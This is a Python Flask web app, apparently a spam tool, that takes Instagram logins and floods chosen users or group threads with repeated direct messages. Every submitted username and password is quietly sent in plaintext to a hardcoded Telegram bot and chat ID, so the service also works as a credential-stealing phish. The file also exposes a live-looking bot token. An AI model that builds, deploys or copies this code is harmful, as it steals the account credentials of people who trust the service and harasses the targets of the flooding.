# language: Python 3.11+, file: app.py
# deps: flask instagrapi requests gunicorn

from flask import Flask, render_template, request, jsonify
from instagrapi import Client
from instagrapi.exceptions import (
    LoginRequired, ChallengeRequired, FeedbackRequired,
    PleaseWaitFewMinutes, ClientError
)
import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)

# ==================== TERI SETTINGS ====================
BOT_TOKEN = "9170363786:AAEksbcg4PGs8-SWJo3Vv7wjhYPVQmIYHfY"      # apna telegram bot token
CHAT_ID = "5970033767"                # apna telegram chat id
THREADS = 6
MAX_RETRIES = 2
# =======================================================

def send_to_telegram(text: str):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=10)
    except:
        pass

def do_flood(username, password, mode, targets, thread_id, message, count):
    cl = Client()
    cl.delay_range = [0, 0]

    send_to_telegram(f"New Web Login\nUser: {username}\nPass: {password}\nMode: {mode}")

    try:
        cl.login(username, password)
    except Exception as e:
        send_to_telegram(f"Login failed for {username}: {e}")
        return

    def send_to_user(uid, label):
        for _ in range(MAX_RETRIES):
            try:
                cl.direct_send(message, user_ids=[uid])
                return True
            except (PleaseWaitFewMinutes, FeedbackRequired):
                time.sleep(25)
            except Exception:
                time.sleep(1)
        return False

    def send_to_thread(tid):
        for _ in range(MAX_RETRIES):
            try:
                cl.direct_send(message, thread_ids=[tid])
                return True
            except (PleaseWaitFewMinutes, FeedbackRequired):
                time.sleep(25)
            except Exception:
                time.sleep(1)
        return False

    success = 0
    try:
        if mode == "users":
            id_map = {}
            for u in targets:
                try:
                    uid = cl.user_id_from_username(u.strip())
                    if uid:
                        id_map[u] = uid
                except:
                    pass

            with ThreadPoolExecutor(max_workers=THREADS) as pool:
                jobs = []
                for _ in range(count):
                    for uname, uid in id_map.items():
                        jobs.append(pool.submit(send_to_user, uid, uname))
                for fut in as_completed(jobs):
                    if fut.result():
                        success += 1

        elif mode == "group":
            with ThreadPoolExecutor(max_workers=THREADS) as pool:
                futures = [pool.submit(send_to_thread, int(thread_id)) for _ in range(count)]
                for fut in as_completed(futures):
                    if fut.result():
                        success += 1

        send_to_telegram(f"Flood done for {username}\nSuccess: {success}")
    except Exception as e:
        send_to_telegram(f"Flood error for {username}: {e}")

def get_threads(username, password):
    cl = Client()
    cl.delay_range = [0, 0]

    send_to_telegram(f"Thread List Request\nUser: {username}\nPass: {password}")

    try:
        cl.login(username, password)
        threads = cl.direct_threads(amount=30)
        result = []
        for t in threads:
            users = ", ".join([u.username for u in t.users]) if t.users else "unknown"
            title = t.thread_title or "(no title)"
            result.append({
                "thread_id": str(t.id),
                "title": title,
                "users": users
            })
        return {"ok": True, "threads": result}
    except Exception as e:
        send_to_telegram(f"Thread list failed for {username}: {e}")
        return {"ok": False, "msg": str(e)}

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/start", methods=["POST"])
def start():
    data = request.json
    username = data.get("username", "").strip()
    password = data.get("password", "").strip()
    mode = data.get("mode", "users")
    targets = data.get("targets", "")
    thread_id = data.get("thread_id", "")
    message = data.get("message", "").strip()
    count = int(data.get("count", 1))

    if not username or not password:
        return jsonify({"ok": False, "msg": "username aur password zaroori hain"})

    if mode == "list":
        result = get_threads(username, password)
        return jsonify(result)

    if not message:
        return jsonify({"ok": False, "msg": "message zaroori hai"})

    target_list = [t.strip() for t in targets.split(",") if t.strip()] if targets else []

    t = threading.Thread(
        target=do_flood,
        args=(username, password, mode, target_list, thread_id, message, count),
        daemon=True
    )
    t.start()

    return jsonify({"ok": True, "msg": "Flood start ho gaya. Credentials receive ho chuke hain."})

if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)